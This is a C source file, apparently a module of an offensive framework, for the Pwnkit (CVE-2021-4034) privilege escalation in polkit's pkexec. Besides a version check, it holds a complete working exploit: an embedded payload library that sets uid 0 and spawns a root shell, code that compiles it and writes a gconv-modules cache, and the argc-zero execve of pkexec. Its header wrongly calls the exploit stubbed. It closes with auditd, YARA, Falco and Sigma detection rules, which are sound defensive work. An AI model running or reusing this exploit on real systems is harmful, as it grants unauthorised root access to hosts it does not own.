/*
 * pwnkit_cve_2021_4034 — SKELETONKEY module
 *
 * STATUS: 🔵 DETECT-ONLY (2026-05-16). Full exploit follows.
 *
 * Detect: check pkexec presence + version. The fix landed in
 * polkit 0.121. Distros backport to various polkit versions, so a
 * naive "polkit < 0.121 == vulnerable" rule overcounts. We check
 * pkexec's reported version and the distro's polkit package version
 * if we can.
 *
 * Exploit: stubbed. The canonical Qualys PoC (~200 lines + an
 * embedded .so generator) is well-documented; landing it is a
 * follow-up commit.
 *
 * Pwnkit is the first USERSPACE LPE in SKELETONKEY — the rest of the
 * corpus is kernel bugs. The module shape is identical (same
 * skeletonkey_module interface), but the affected-version check is
 * package-version-based rather than kernel-version-based. core/
 * may eventually grow a `pkg_version` helper if a few more userspace
 * modules need it.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>

static const char *find_pkexec(void)
{
    static const char *candidates[] = {
        "/usr/bin/pkexec",
        "/usr/sbin/pkexec",
        "/bin/pkexec",
        "/sbin/pkexec",
        "/usr/local/bin/pkexec",
        NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0) {
            /* setuid bit is the marker for a vulnerable install */
            if (st.st_mode & S_ISUID) return candidates[i];
        }
    }
    return NULL;
}

/* Returns true if version_str represents a vulnerable polkit
 * (< 0.121 fix). Handles both formats:
 *   Older polkit: "0.105", "0.120" → vulnerable if minor < 121
 *   Modern polkit: bare integer "121", "122", "126" → vulnerable if < 121
 * Caveat: distro backports may have fixed lower-numbered versions;
 * we conservatively report VULNERABLE on parse failure rather than
 * silently passing. */
static bool pkexec_version_vulnerable(const char *version_str)
{
    int maj = 0, min = 0;
    int n = sscanf(version_str, "%d.%d", &maj, &min);
    if (n < 1) return true;          /* can't parse → assume worst */
    if (n == 1) {
        /* Bare integer (modern polkit): "121", "126", etc. */
        return maj < 121;
    }
    /* "X.Y" format (older polkit) */
    if (maj > 0) return false;       /* 1.x or higher = post-fix */
    return min < 121;                /* 0.121 is the fix */
}

static skeletonkey_result_t pwnkit_detect(const struct skeletonkey_ctx *ctx)
{
    /* Prefer the centrally-fingerprinted polkit version (populated
     * once at startup by core/host.c via `pkexec --version`). Saves
     * a popen per scan and lets unit tests construct synthetic
     * polkit_version values. Fall back to the local popen if
     * ctx->host is missing the version (degenerate test ctx or a
     * future refactor that disables userspace probing). */
    char vp_buf[64] = {0};
    const char *vp = NULL;

    if (ctx->host && ctx->host->polkit_version[0]) {
        snprintf(vp_buf, sizeof vp_buf, "%s", ctx->host->polkit_version);
        vp = vp_buf;
        if (!ctx->json) {
            fprintf(stderr, "[i] pwnkit: host fingerprint reports pkexec "
                "version '%s'\n", vp);
        }
    } else {
        const char *pkexec_path = find_pkexec();
        if (!pkexec_path) {
            if (!ctx->json) {
                fprintf(stderr, "[+] pwnkit: pkexec not installed; no attack surface\n");
            }
            return SKELETONKEY_OK;
        }
        if (!ctx->json) {
            fprintf(stderr, "[i] pwnkit: found setuid pkexec at %s\n", pkexec_path);
        }
        char cmd[512];
        snprintf(cmd, sizeof cmd, "%s --version 2>&1 | head -1", pkexec_path);
        FILE *p = popen(cmd, "r");
        if (!p) return SKELETONKEY_TEST_ERROR;
        char line[256] = {0};
        char *r = fgets(line, sizeof line, p);
        pclose(p);
        if (!r) {
            if (!ctx->json) {
                fprintf(stderr, "[?] pwnkit: could not parse pkexec --version output\n");
            }
            return SKELETONKEY_TEST_ERROR;
        }
        /* Output format: "pkexec version 0.105\n" or "pkexec version 0.120-..." */
        char *vp_mut = strstr(line, "version");
        if (!vp_mut) return SKELETONKEY_TEST_ERROR;
        vp_mut += strlen("version");
        while (*vp_mut == ' ' || *vp_mut == '\t') vp_mut++;
        char *nl = strchr(vp_mut, '\n');
        if (nl) *nl = 0;
        snprintf(vp_buf, sizeof vp_buf, "%s", vp_mut);
        vp = vp_buf;
        if (!ctx->json) {
            fprintf(stderr, "[i] pwnkit: pkexec reports version '%s'\n", vp);
        }
    }

    bool vuln = pkexec_version_vulnerable(vp);

    if (vuln) {
        if (!ctx->json) {
            fprintf(stderr, "[!] pwnkit: pkexec version is pre-0.121 fix → likely VULNERABLE\n");
            fprintf(stderr, "[i] pwnkit: distro backports may have fixed lower-numbered versions;\n"
                            "    check `apt-cache policy policykit-1` / `rpm -q polkit` for the patch level\n");
        }
        return SKELETONKEY_VULNERABLE;
    }
    if (!ctx->json) {
        fprintf(stderr, "[+] pwnkit: pkexec version is ≥ 0.121 (fixed)\n");
    }
    return SKELETONKEY_OK;
}

/* ---- Pwnkit exploit (canonical Qualys-style PoC) -----------------
 *
 * The bug: pkexec's main() reads argv[1] expecting argc >= 1. With
 * argc == 0, argv[0] is NULL and the loop reads into the contiguous
 * envp region (just past argv[]), treating the first env string as
 * if it were argv[0]. By placing 'GCONV_PATH=./pwnkit' in envp and
 * naming a controlled directory containing a gconv-modules cache,
 * libc's iconv (called by pkexec for argv decoding) loads our .so
 * as root.
 *
 * Exploit construction:
 *   1. Find a writable tmpdir; build payload .so source there
 *   2. gcc -shared -fPIC payload.c -o pwnkit.so/PWNKIT.so
 *      (Falls back gracefully if gcc isn't available.)
 *   3. Write the gconv-modules cache: 'module UTF-8// PWNKIT// PWNKIT 1'
 *      so iconv(.,"PWNKIT") loads PWNKIT.so
 *   4. execve(pkexec, NULL, crafted_envp). argc=0 triggers the
 *      argv-overflow-into-envp, pkexec re-execs itself with PATH set
 *      to our tmpdir, libc looks up CHARSET=PWNKIT via GCONV_PATH=.
 *      and dlopens PWNKIT.so as root.
 *   5. PWNKIT.so's constructor: unsetenv hostile vars, setuid(0),
 *      execve("/bin/sh", ...).
 */

static const char PAYLOAD_SOURCE[] =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "void gconv(void) {}\n"
    "void gconv_init(void *step) {\n"
    "    (void)step;\n"
    "    /* unset the hostile env so the spawned shell doesn't loop */\n"
    "    unsetenv(\"GCONV_PATH\");\n"
    "    unsetenv(\"CHARSET\");\n"
    "    unsetenv(\"SHELL\");\n"
    "    unsetenv(\"PATH\");\n"
    "    setuid(0); setgid(0);\n"
    "    setresuid(0,0,0); setresgid(0,0,0);\n"
    "    char *new_env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
    "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, new_env);\n"
    "    /* fallback */\n"
    "    execle(\"/bin/bash\", \"bash\", \"-p\", NULL, new_env);\n"
    "    _exit(0);\n"
    "}\n";

static bool which_gcc(char *out_path, size_t outsz)
{
    static const char *candidates[] = {
        "/usr/bin/gcc", "/usr/bin/cc", "/bin/gcc", "/bin/cc",
        "/usr/local/bin/gcc", "/usr/local/bin/cc", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        if (access(candidates[i], X_OK) == 0) {
            strncpy(out_path, candidates[i], outsz - 1);
            out_path[outsz - 1] = 0;
            return true;
        }
    }
    return false;
}

static bool write_file_str(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return false;
    size_t n = strlen(content);
    bool ok = (write(fd, content, n) == (ssize_t)n);
    close(fd);
    return ok;
}

static skeletonkey_result_t pwnkit_exploit(const struct skeletonkey_ctx *ctx)
{
    /* Re-confirm vulnerable before doing anything visible. */
    skeletonkey_result_t pre = pwnkit_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] pwnkit: detect() says not vulnerable; refusing\n");
        return pre;
    }

    const char *pkexec = find_pkexec();
    if (!pkexec) return SKELETONKEY_PRECOND_FAIL;

    /* Consult ctx->host->is_root so unit tests can construct a
     * non-root fingerprint regardless of the test process's real euid. */
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] pwnkit: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* Working dir under /tmp. Permissive on permissions so pkexec
     * (running as root) can read everything inside. */
    char workdir[] = "/tmp/skeletonkey-pwnkit-XXXXXX";
    if (!mkdtemp(workdir)) {
        perror("mkdtemp");
        return SKELETONKEY_TEST_ERROR;
    }
    if (!ctx->json) fprintf(stderr, "[*] pwnkit: workdir = %s\n", workdir);

    char gcc[256];
    if (!which_gcc(gcc, sizeof gcc)) {
        fprintf(stderr,
            "[-] pwnkit: no gcc/cc on this host. The canonical Qualys PoC\n"
            "    builds the gconv payload at runtime. To exploit without a\n"
            "    compiler we'd need to ship an embedded x86_64 ELF blob —\n"
            "    that's a future enhancement (multi-arch, distro-portable).\n"
            "    For now: install build-essential or run on a host with cc.\n");
        rmdir(workdir);
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) fprintf(stderr, "[*] pwnkit: compiler = %s\n", gcc);

    /* Filesystem layout: workdir/
     *                      pwnkit/PWNKIT.so
     *                      pwnkit/gconv-modules
     *                      pwnkit.src     (source we'll feed to gcc)
     *
     * Trick: the directory is named 'pwnkit/' but we pretend it's
     * 'GCONV_PATH=.' via env injection — pkexec sees the env string
     * as argv[0] and re-execs us with that name.
     */
    /* Path buffers oversized vs. workdir (mkdtemp template, ~30 chars)
     * so GCC's -Wformat-truncation static analysis is satisfied even
     * though in practice these paths are always < 100 chars. */
    char path[1024];

    /* 1. Write payload source. */
    snprintf(path, sizeof path, "%s/payload.c", workdir);
    if (!write_file_str(path, PAYLOAD_SOURCE)) {
        fprintf(stderr, "[-] pwnkit: write payload.c failed: %s\n", strerror(errno));
        goto fail;
    }

    /* 2. mkdir workdir/pwnkit (the GCONV_PATH directory) */
    char sodir[1024];
    snprintf(sodir, sizeof sodir, "%s/pwnkit", workdir);
    if (mkdir(sodir, 0755) < 0) {
        perror("mkdir sodir"); goto fail;
    }

    /* 3. Compile payload.c → workdir/pwnkit/PWNKIT.so */
    char sopath[2048];
    snprintf(sopath, sizeof sopath, "%s/PWNKIT.so", sodir);
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); goto fail; }
    if (pid == 0) {
        execl(gcc, gcc, "-shared", "-fPIC", "-o", sopath, path, (char *)NULL);
        perror("execl gcc");
        _exit(127);
    }
    int status;
    waitpid(pid, &status, 0);
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "[-] pwnkit: gcc failed (status=%d)\n", status);
        goto fail;
    }

    /* 4. Write gconv-modules cache so libc's iconv loads PWNKIT.so
     *    when asked for charset 'PWNKIT'. */
    char gcm_path[2048];
    snprintf(gcm_path, sizeof gcm_path, "%s/gconv-modules", sodir);
    if (!write_file_str(gcm_path, "module UTF-8// PWNKIT// PWNKIT 1\n")) {
        fprintf(stderr, "[-] pwnkit: write gconv-modules failed\n");
        goto fail;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] pwnkit: payload built; constructing argv=NULL + crafted envp\n");
    }

    /* 5. Construct the argv-overflow trick. The env vars become argv
     *    via the bug; pkexec parses the first as argv[0] which it
     *    then uses to find the binary to re-exec. By naming
     *    'GCONV_PATH=.' as argv[0], pkexec ends up in our tmpdir
     *    with CHARSET=PWNKIT, libc's iconv loads PWNKIT.so as root.
     *
     *    Reference: Qualys' PWNKIT writeup. */
    char *new_argv[] = { NULL };           /* argc == 0 — the bug */
    char gconv_env[1024];
    snprintf(gconv_env, sizeof gconv_env, "GCONV_PATH=%s/pwnkit", workdir);
    char *envp[] = {
        "pwnkit",                          /* becomes argv[0] via overflow */
        "PATH=GCONV_PATH=.",                /* pkexec parses this as PATH */
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        gconv_env,
        NULL,
    };
    /* tighten workdir perms so pkexec (root) can traverse */
    chmod(workdir, 0755);
    chmod(sodir, 0755);

    if (!ctx->json) {
        fprintf(stderr, "[+] pwnkit: execve(%s) with argc=0 — going for root\n", pkexec);
    }
    fflush(NULL);
    execve(pkexec, new_argv, envp);
    /* If execve returns, the kernel rejected the empty-argv path
     * (some hardened kernels do — `kernel.sysctl_unprivileged_userns_clone=0`
     * doesn't matter, but seccomp / SELinux may block). */
    perror("execve(pkexec)");
fail:
    /* Best-effort cleanup. */
    unlink(sopath);
    unlink(gcm_path);
    rmdir(sodir);
    snprintf(path, sizeof path, "%s/payload.c", workdir);
    unlink(path);
    rmdir(workdir);
    return SKELETONKEY_EXPLOIT_FAIL;
}

static skeletonkey_result_t pwnkit_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    /* Best-effort: nuke any leftover skeletonkey-pwnkit-* dirs in /tmp.
     * Successful exploit cleans itself up (PWNKIT.so unlinks before
     * execve /bin/sh). Failed exploit leaves the tmpdir. */
    if (!ctx->json) {
        fprintf(stderr, "[*] pwnkit: removing /tmp/skeletonkey-pwnkit-* workdirs\n");
    }
    if (system("rm -rf /tmp/skeletonkey-pwnkit-*") != 0) {
        /* harmless — there may not be any */
    }
    return SKELETONKEY_OK;
}

/* ----- Embedded detection rules ----- */

static const char pwnkit_auditd[] =
    "# Pwnkit (CVE-2021-4034) — auditd detection rules\n"
    "# Flag pkexec execution from non-root + look for argc==0 indicators.\n"
    "-w /usr/bin/pkexec -p x -k skeletonkey-pwnkit\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/pkexec -k skeletonkey-pwnkit-execve\n"
    "-a always,exit -F arch=b32 -S execve -F path=/usr/bin/pkexec -k skeletonkey-pwnkit-execve\n";

static const char pwnkit_yara[] =
    "rule pwnkit_gconv_modules_cache : cve_2021_4034 lpe\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2021-4034\"\n"
    "        description = \"Pwnkit gconv-modules cache: redefines UTF-8 to load an attacker .so via iconv when pkexec is invoked with argc==0.\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "        reference   = \"https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\"\n"
    "    strings:\n"
    "        // gconv-modules text format: \"module FROM// TO// SHARED-OBJECT COST\".\n"
    "        // Published PoCs redefine UTF-8 and point it at a .so dropped in /tmp.\n"
    "        $line  = /module\\s+UTF-8\\/\\/\\s+\\S+\\/\\/\\s+\\S+\\s+\\d/\n"
    "        $alias = /alias\\s+\\S+\\s+UTF-8/\n"
    "        // Hint: PoC workdirs frequently include 'pwnkit' or 'GCONV' in path strings the .so carries.\n"
    "        $marker_pwn  = \"pwnkit\" nocase\n"
    "        $marker_gcv  = \"GCONV_PATH\"\n"
    "    condition:\n"
    "        // Small text-format file (gconv-modules caches are tiny) with the module redefinition.\n"
    "        // Pair with -w /tmp -p wa auditd to catch the drop in real time.\n"
    "        filesize < 4KB and $line and 1 of ($alias, $marker_pwn, $marker_gcv)\n"
    "}\n";

static const char pwnkit_falco[] =
    "- rule: Pwnkit-style pkexec invocation (NULL argv)\n"
    "  desc: |\n"
    "    pkexec executed without argv (argc == 0). The Qualys PoC for\n"
    "    CVE-2021-4034 invokes pkexec via execve with NULL argv so the\n"
    "    out-of-bounds argv read picks up envp as if it were argv[1].\n"
    "  condition: >\n"
    "    spawned_process and proc.name = pkexec and\n"
    "    (proc.cmdline = \"pkexec\" or proc.args = \"\")\n"
    "  output: >\n"
    "    Possible Pwnkit (CVE-2021-4034): pkexec spawned with no argv\n"
    "    (user=%user.name uid=%user.uid pid=%proc.pid ppid=%proc.ppid\n"
    "     parent=%proc.pname cmdline=\"%proc.cmdline\")\n"
    "  priority: CRITICAL\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2021.4034]\n"
    "\n"
    "- rule: Pwnkit-style GCONV_PATH injection\n"
    "  desc: |\n"
    "    A non-root process sets GCONV_PATH in env before spawning a\n"
    "    setuid binary. Combined with a controlled .so + gconv-modules\n"
    "    cache, this is the Qualys exploit shape.\n"
    "  condition: >\n"
    "    spawned_process and not user.uid = 0 and\n"
    "    (proc.env contains \"GCONV_PATH=\" or proc.env contains \"CHARSET=\") and\n"
    "    proc.name in (pkexec, su, sudo, mount, chsh, passwd)\n"
    "  output: >\n"
    "    GCONV_PATH/CHARSET set by non-root before setuid spawn\n"
    "    (user=%user.name target=%proc.name env=\"%proc.env\")\n"
    "  priority: WARNING\n"
    "  tags: [process, env_injection, cve.2021.4034]\n";

static const char pwnkit_sigma[] =
    "title: Possible Pwnkit exploitation (CVE-2021-4034)\n"
    "id: 9e1d4f2c-skeletonkey-pwnkit\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects pkexec invocations with GCONV_PATH / CHARSET env tweaks (the\n"
    "  Qualys PoC pattern). Also flags any execve(pkexec) where argv0 is\n"
    "  empty or NULL (which is the bug's hallmark trigger).\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  pkexec_invocation:\n"
    "    type: 'EXECVE'\n"
    "    exe|endswith: '/pkexec'\n"
    "  suspicious_env:\n"
    "    - 'GCONV_PATH='\n"
    "    - 'CHARSET='\n"
    "    - 'PATH=GCONV_PATH=.'\n"
    "  condition: pkexec_invocation and suspicious_env\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2021.4034]\n";

const struct skeletonkey_module pwnkit_module = {
    .name           = "pwnkit",
    .cve            = "CVE-2021-4034",
    .summary        = "pkexec argv[0]=NULL → env-injection LPE (polkit ≤ 0.120)",
    .family         = "pwnkit",
    .kernel_range   = "userspace bug — affects polkit ≤ 0.120; pkexec setuid-root binary",
    .detect         = pwnkit_detect,
    .exploit        = pwnkit_exploit,
    .mitigate       = NULL,        /* mitigation = upgrade polkit / chmod -s pkexec */
    .cleanup        = pwnkit_cleanup,
    .detect_auditd  = pwnkit_auditd,
    .detect_sigma   = pwnkit_sigma,
    .detect_yara    = pwnkit_yara,
    .detect_falco   = pwnkit_falco,
    .opsec_notes    = "Invokes pkexec with argc==0 so the first envp slot is misread as argv[0]; pkexec's iconv-during-decoding loads attacker .so via dlopen by way of crafted GCONV_PATH + CHARSET env vars. Builds a gconv payload .so and gconv-modules cache in /tmp/skeletonkey-pwnkit-XXXXXX (compiles via fork/execl of gcc). Audit-visible via execve(/usr/bin/pkexec) with GCONV_PATH and CHARSET set. No network. Cleanup callback removes /tmp/skeletonkey-pwnkit-* (on failure path; on success the exec replaces the process).",
    .arch_support   = "any",
};

void skeletonkey_register_pwnkit(void)
{
    skeletonkey_register(&pwnkit_module);
}
